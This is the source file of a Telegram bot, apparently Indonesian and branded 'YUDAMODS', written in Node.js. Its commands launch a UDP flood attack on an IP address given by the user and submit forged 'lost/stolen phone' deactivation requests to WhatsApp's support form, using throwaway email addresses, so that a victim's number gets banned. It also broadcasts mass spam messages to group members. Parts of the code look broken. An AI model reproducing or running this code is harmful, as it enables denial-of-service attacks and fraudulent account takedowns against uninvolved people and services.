const { Telegraf } = require('telegraf');
const { TELEGRAM_BOT_TOKEN } = require('./settings');
const axios = require('axios');
const cheerio = require('cheerio');
const figlet = require('figlet');
const chalk = require('chalk');
const fs = require('fs');
const util = require('util');
const { watchFile, unwatchFile } = fs;
const { fileURLToPath } = require('url');
const dgram = require('dgram');
const translate = require('translate-google');

const bot = new Telegraf(TELEGRAM_BOT_TOKEN);

let userList = [];

let attacking = false;

const thumbPath = 'https://telegra.ph/file/ba12c1ba24d23404c1e00.jpg';

bot.start((ctx) => {
    ctx.replyWithPhoto(thumbPath, { caption:'Welcome to the WhatsApp submission bot! Use /menu to view all menu.' });
});

bot.use((ctx, next) => {
    console.log(`[${new Date().toLocaleString()}] Received message from ${ctx.from.username}: ${ctx.message.text}`);
    next();
});

bot.start((ctx) => {
    const userId = ctx.message.from.id;
    const userNumber = ctx.message.from.username || ctx.message.from.id.toString(); 

    const existingUser = userList.find(user => user === `${userId}/${userNumber}`);

    if (!existingUser) {
        userList.push(`${userId}/${userNumber}`);
        ctx.reply(`Selamat datang, ${userNumber}. Anda telah ditambahkan ke daftar.`);
    }
});

bot.command('bc', (ctx) => {
    const bcMessage = ctx.message.text.split(' ').slice(1).join(' ');

    switch (true) {
        case !bcMessage:
            ctx.reply('Contoh penggunaan:\n/bc Pesan Anda');
            break;

        default:
            userList.forEach(user => {
                const [userId, userNumber] = user.split('/');
                bot.telegram.sendPhoto(userNumber, { source: thumbPath }, { caption: bcMessage });
            });

            ctx.reply('Pesan broadcast telah dikirim ke semua pengguna.');
            break;
    }
});

bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const messageText = msg.text ? msg.text.toLowerCase() : '';
    const caption = msg.caption ? msg.caption.toLowerCase() : '';

    if ((messageText === '/startattack' || caption.startsWith('/startattack')) && !attacking) {
        attacking = true;

        const targetIPMatch = caption.match(/\/startattack\s+([\d.]+)/);
        const targetIP = targetIPMatch ? targetIPMatch[1] : '0.0.0.0';
        const targetPort = 80; // Change to your target port
        const duration = 60; // Attack duration in seconds

        const socket = dgram.createSocket('udp4');
        const message = Buffer.from('A'); // UDP payload

        let startTime = Date.now();
        const endTime = startTime + (duration * 1000);

        console.log(`Starting UDP flood attack on ${targetIP}:${targetPort} for ${duration} seconds`);

        const sendPacket = () => {
            if (attacking) {
                socket.send(message, targetPort, targetIP, (err) => {
                    if (err) {
                        console.error(err);
                    }
                });

                if (Date.now() < endTime) {
                    setTimeout(sendPacket, 1); // Send packets as fast as possible
                } else {
                    console.log('Attack completed');
                    attacking = false;
                    socket.close();
                }
            }
        };

        sendPacket();

        bot.sendMessage(chatId, `UDP flood attack started on ${targetIP}:${targetPort} for ${duration} seconds`);
    } else if (messageText === '/stopattack' && attacking) {
        attacking = false;
        bot.sendMessage(chatId, 'Attack stopped');
    }
});



bot.command('jpm', (ctx) => {
    const jpmMessage = ctx.message.text.split(' ').slice(1).join(' ');

    switch (true) {
        case !jpmMessage:
            ctx.reply('Contoh penggunaan:\n/jpm Pesan Anda');
            break;

        default:
            userList.forEach(user => {
                const [userId, userNumber] = user.split('/');
                bot.telegram.sendPhoto(userNumber, { source: thumbPath }, { caption: jpmMessage });
            });

            ctx.reply('Pesan jpm telah dikirim ke semua pengguna.');
            break;
    }
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const messageText = msg.text;

    // Check the command using switch-case structure
    switch (messageText.split(' ')[0]) {
        case '/translate':
            try {
                // Extract the text to translate from the message
                const textToTranslate = messageText.replace('/translate ', '');

                // Translate the text from English to Spanish
                const translatedText = await translate(textToTranslate, {to: 'es'});
                bot.sendMessage(chatId, `Translated: ${translatedText}`);
            } catch (error) {
                bot.sendMessage(chatId, 'Error translating message.');
            }
            break;
        default:
            break;
    }
});



bot.on('text', async (ctx) => {
  const message = ctx.message.text;
  const command = message.split(' ')[0];
  const now = new Date();
  const hour = now.getHours();
  const greeting = getGreeting(hour);
  const name = ctx.from.first_name;
  const tag = ctx.from.username;

  switch (command) {
    case '/menu':
      const menuText = `${greeting} Kak ${name}!

╭──❏「 𝗜𝗡𝗙𝗢 𝗨𝗦𝗘𝗥 」❏
├ Nama = ${name}
├ Tag = ${tag}
╠──❏「 𝗜𝗡𝗙𝗢 𝗕𝗢𝗧𝗭 」❏
╠ Nama Bot = YUDAMODS - VIP
├ Owner = @YUDAMODS
├ Founder = @YUDAMODS
╰──❏「 YUDAMODS  」❏

┏━━━━━[ LIST 𝗠𝗘𝗡𝗨 ]━━━━━
┃⿻ /pushkontakmenu
┃⿻ /allmenu
┃⿻ /ddosmenu
┃⿻ /translatemenu
┗━━━━━[ YUDAMODS  ]━━━━
       
          ⌕ █║▌║▌║ - ║▌║▌║█ ⌕`;
      ctx.replyWithPhoto(thumbPath, { caption: menuText });
      break;

    case '/allmenu':
      const allmenuText = `${greeting} Kak ${name}!

╭──❏「 𝗜𝗡𝗙𝗢 𝗨𝗦𝗘𝗥 」❏
├ Nama = ${name}
├ Tag = ${tag}
╠──❏「 𝗜𝗡𝗙𝗢 𝗕𝗢𝗧𝗭 」❏
╠ Nama Bot = YUDAMODS - VIP
├ Owner = @YUDAMODS
├ Founder = @YUDAMODS
╰──❏「 YUDAMODS  」❏

┏━━━━━[ LIST 𝗠𝗘𝗡𝗨 ]━━━━━
┃⿻ /menu
┃⿻ /bannedwa
┃⿻ /unbanwa
┃⿻ /temp
┃⿻ /pushkontakmenu
┃⿻ /cekidgc
┃⿻ /translate
┃⿻ /translatemenu
┃⿻ /ddosmenu
┃⿻ /startattack
┃⿻ /stopattack
┃⿻ /pushkontak
┃⿻ /jpm
┃⿻ /bc
┃⿻ /owner
┗━━━━━[ YUDAMODS  ]━━━━
       
          ⌕ █║▌║▌║ - ║▌║▌║█ ⌕`;
      ctx.replyWithPhoto(thumbPath, { caption: allmenuText });
      break;
      
      
      case '/translatemenu':
      const translateText = `${greeting} Kak ${name}!

╭──❏「 𝗜𝗡𝗙𝗢 𝗨𝗦𝗘𝗥 」❏
├ Nama = ${name}
├ Tag = ${tag}
╠──❏「 𝗜𝗡𝗙𝗢 𝗕𝗢𝗧𝗭 」❏
╠ Nama Bot = YUDAMODS - VIP
├ Owner = @YUDAMODS
├ Founder = @YUDAMODS
╰──❏「 YUDAMODS  」❏

┏━━━━━[ LIST 𝗠𝗘𝗡𝗨 ]━━━━━
┃⿻ /translate
┗━━━━━[ YUDAMODS  ]━━━━
       
          ⌕ █║▌║▌║ - ║▌║▌║█ ⌕`;
      ctx.replyWithPhoto(thumbPath, { caption: translateText });
      break;
      
      case '/ddosmenu':
      const ddosText = `${greeting} Kak ${name}!

╭──❏「 𝗜𝗡𝗙𝗢 𝗨𝗦𝗘𝗥 」❏
├ Nama = ${name}
├ Tag = ${tag}
╠──❏「 𝗜𝗡𝗙𝗢 𝗕𝗢𝗧𝗭 」❏
╠ Nama Bot = YUDAMODS - VIP
├ Owner = @YUDAMODS
├ Founder = @YUDAMODS
╰──❏「 YUDAMODS  」❏

┏━━━━━[ LIST 𝗠𝗘𝗡𝗨 ]━━━━━
┃⿻ /startattack
┃⿻ /stopattack
┗━━━━━[ YUDAMODS  ]━━━━
       
          ⌕ █║▌║▌║ - ║▌║▌║█ ⌕`;
      ctx.replyWithPhoto(thumbPath, { caption: ddosText });
      break;

    case '/pushkontakmenu':
    const keyboard = {
        reply_markup: {
            keyboard: [
                [{ text: '/lanjutkan' }]
            ],
            resize_keyboard: true
        }
    };
    
    ctx.replyWithPhoto(thumbPath, { caption: `Anda yakin dengan pilihan Anda? Whatsapp Anda dapat diblokir jika baru saja menautkan dengan bot. Silahkan ketik /lanjutkan untuk melanjutkan.`, keyboard });
    break;

    case '/pushkontak':
    const pushkontakArgs = message.split(' ').slice(1).join(' ');
    const pushkontakParams = pushkontakArgs.split('|');

    if (pushkontakParams.length !== 3) {
        ctx.replyWithPhoto(thumbPath, { caption: "Format yang Anda masukkan salah. Silakan gunakan format: /pushkontak idgroup|jeda|teks" });
        return;
    }

    const idGroup = pushkontakParams[0];
    const jeda = parseInt(pushkontakParams[1]);
    const teks = pushkontakParams[2];

    if (!idGroup || !jeda || !teks) {
        ctx.replyWithPhoto(thumbPath, { caption: "Format yang Anda masukkan salah. Silakan gunakan format: /pushkontak idgroup|jeda|teks" });
        return;
    }

    ctx.replyWithPhoto(thumbPath, { caption: "Proses pengiriman kontak sedang berlangsung..." });

    try {
        const groupMetadata = await ctx.getChat(idGroup);
        const participants = groupMetadata.participants;
        const halls = participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
        
        for (let mem of halls) {
            if (/image/.test(mime)) {
                const media = await ctx.telegram.getFileLink(ctx.message.photo[0].file_id);
                await ctx.telegram.sendPhoto(mem, { source: media.href, caption: teks });
                await sleep(jeda);
            } else {
                await ctx.telegram.sendMessage(mem, teks);
                await sleep(jeda);
            }
        }

        ctx.replyWithPhoto(thumbPath, { caption: "Pengiriman kontak selesai!" });
    } catch (error) {
        ctx.replyWithPhoto(thumbPath, { caption: `Terjadi kesalahan: ${error.message}` });
    }
    break;
    
    case '/owner':
      // Mengirim link Telegram Anda dalam format kontak
      ctx.replyWithContact({ phone_number: 't.me/YUDAMODS', first_name: 'YUDAMODS' });
      break;

    case '/lanjutkan':
        const lanjutkanText = `${greeting} Kak ${name}!

╭──❏「 𝗜𝗡𝗙𝗢 𝗨𝗦𝗘𝗥 」❏
├ Nama = ${name}
├ Tag = ${tag}
╠──❏「 𝗜𝗡𝗙𝗢 𝗕𝗢𝗧𝗭 」❏
╠ Nama Bot = YUDAMODS - VIP
├ Owner = @YUDAMODS
├ Founder = @YUDAMODS
╰──❏「 YUDAMODS  」❏

┏━━━━━[ LIST 𝗠𝗘𝗡𝗨 ]━━━━━
┃⿻ /cekidgc
┃⿻ /jpm
┃⿻ /bc
┃⿻ /pushkontak idgroup|jeda|teks
┗━━━━━[ YUDAMODS  ]━━━━
       
          ⌕ █║▌║▌║ - ║▌║▌║█ ⌕`;
        ctx.replyWithPhoto(thumbPath, { caption: lanjutkanText });
        break;

    case '/cekidgc':
        const chatId = ctx.message.chat.id;
        ctx.replyWithPhoto(thumbPath, { caption: `Cek ID Group:\nChat ID: ${chatId}` });
        break;
        
    case '/bannedwa':
    case '/kenonwa':
    case '/banned':
            const bannedArgs = message.split(' ');
            const bannedPhoneNumber = bannedArgs.length > 1 ? bannedArgs[1] : null;
            if (!bannedPhoneNumber) {
                ctx.replyWithPhoto(thumbPath, { caption: "Please provide the target phone number."});
                return;
            }
            try {
                const ntah = await axios.get("https://www.whatsapp.com/contact/noclient/");
                const email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
                const cookie = ntah.headers["set-cookie"].join("; ");
                const $ = cheerio.load(ntah.data);
                const $form = $("form");
                const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
                const form = new URLSearchParams();

                form.append("jazoest", $form.find("input[name=jazoest]").val());
                form.append("lsd", $form.find("input[name=lsd]").val());
                form.append("step", "submit");
                form.append("country_selector", "ID");
                form.append("phone_number", bannedPhoneNumber);
                form.append("email", email.data[0]);
                form.append("email_confirm", email.data[0]);
                form.append("platform", "ANDROID");
                form.append("your_message", "Perdido/roubado: desative minha conta");
                form.append("__user", "0");
                form.append("__a", "1");
                form.append("__csr", "");
                form.append("__req", "8");
                form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
                form.append("dpr", "1");
                form.append("__ccg", "UNKNOWN");
                form.append("__rev", "1006630858");
                form.append("__comment_req", "0");

                const res = await axios({
                    url,
                    method: "POST",
                    data: form,
                    headers: {
                        cookie
                    }
                });

                const responseData = JSON.parse(res.data.replace("for (;;);", ""));
                ctx.reply(util.format(responseData));
            } catch (error) {
                ctx.reply(`Oops! Something went wrong: ${error.message}`);
            }
            break;
            
     case '/unbannedwa':
     case '/unbanwa':
     case '/unban':
            const unbannedArgs = message.split(' ');
            const unbannedPhoneNumber = unbannedArgs.length > 1 ? unbannedArgs[1] : null;
            if (!unbannedPhoneNumber) {
                ctx.replyWithPhoto(thumbPath, { caption: "Please provide the target phone number."});
                return;
            }
            try {
                const ntah = await axios.get("https://www.whatsapp.com/contact/noclient/");
                const email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
                const cookie = ntah.headers["set-cookie"].join("; ");
                const $ = cheerio.load(ntah.data);
                const $form = $("form");
                const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
                const form = new URLSearchParams();

                form.append("jazoest", $form.find("input[name=jazoest]").val());
                form.append("lsd", $form.find("input[name=lsd]").val());
                form.append("step", "submit");
                form.append("country_selector", "ID");
                form.append("phone_number", unbannedPhoneNumber);
                form.append("email", email.data[0]);
                form.append("email_confirm", email.data[0]);
                form.append("platform", "ANDROID");
                form.append("your_message", "مرحبًا ، أنا رودولفو ، أحتاج إلى مساعدتك ، لقد سُرق هاتفي المحمول ومعه شريحتي مع WhatsApp ، لا أريد أن أفسد أشيائي الشخصية ، مثل الأشياء من شركتي وخططي ، أريد رقمي معطل! حتى أتمكن من استعادة بطاقة Sim أو محاولة استرداد هاتفي! الرقم");
                form.append("__user", "0");
                form.append("__a", "1");
                form.append("__csr", "");
                form.append("__req", "8");
                form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
                form.append("dpr", "1");
                form.append("__ccg", "UNKNOWN");
                form.append("__rev", "1006630858");
                form.append("__comment_req", "0");

                const res = await axios({
                    url,
                    method: "POST",
                    data: form,
                    headers: {
                        cookie
                    }
                });

                const responseData = JSON.parse(res.data.replace("for (;;);", ""));
                ctx.reply(util.format(responseData));
            } catch (error) {
                ctx.reply(`Oops! Something went wrong: ${error.message}`);
            }
            break;
        case '/temp':

            const dropArgs = message.split(' ');
            const dropPhoneNumber = dropArgs.length > 1 ? dropArgs[1] : null;
            if (!dropPhoneNumber) {
                ctx.replyWithPhoto(thumbPath, { caption: "Please provide the target phone number."});
                return;
            }
            const ddi = dropPhoneNumber.substring(0, 2);
            const number = dropPhoneNumber.substring(2);

            try {
                const res = await dropNumber({ phoneNumber: dropPhoneNumber, ddi, number });
                ctx.reply(`Success! System number ${ddi}${number} has been initiated.`);
            } catch (error) {
                ctx.reply(`Oops! Something went wrong: ${error.message}`);
            }
            break;
        default:
            // Handle unknown commands or do nothing
            break;
    }
});

const dropNumber = async (context) => {
    const { phoneNumber, ddi, number } = context;
    const numbers = JSON.parse(fs.readFileSync('./YUDAMODS/crash.json'));

    try {
        const ntah = await axios.get("https://www.whatsapp.com/contact/noclient/");
        const email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
        const cookie = ntah.headers["set-cookie"].join("; ");
        const $ = cheerio.load(ntah.data);
        const $form = $("form");
        const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
        const form = new URLSearchParams();

        form.append("jazoest", $form.find("input[name=jazoest]").val());
        form.append("lsd", $form.find("input[name=lsd]").val());
        form.append("step", "submit");
        form.append("country_selector", "ID");
        form.append("phone_number", phoneNumber);
        form.append("email", email.data[0]);
        form.append("email_confirm", email.data[0]);
        form.append("platform", "ANDROID");
        form.append("your_message", "Perdido/roubado: desative minha conta");
        form.append("__user", "0");
        form.append("__a", "1");
        form.append("__csr", "");
        form.append("__req", "8");
        form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
        form.append("dpr", "1");
        form.append("__ccg", "UNKNOWN");
        form.append("__rev", "1006630858");
        form.append("__comment_req", "0");

        const res = await axios({
            url,
            method: "POST",
            data: form,
            headers: {
                cookie
            }
        });

        return true;
    } catch (error) {
        throw new Error(`Failed to initiate system number ${ddi}${number}: ${error.message}`);
    }
};

   // default:
     //   break;
  //}

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const getGreeting = (hour) => {
  if (hour >= 5 && hour < 12) return 'Selamat Pagi';
  if (hour >= 12 && hour < 18) return 'Selamat Siang';
  if (hour >= 18 && hour < 24) return 'Selamat Malam';
  return 'Selamat';
};

bot.launch();

figlet('YudaMods', (err, data) => {
  if (err) {
    console.error('Error rendering figlet:', err);
    return;
  }
  console.log(chalk.blue(data)); // Use chalk to display in blue
  console.log(chalk.blue('Bot is Running...'));
});
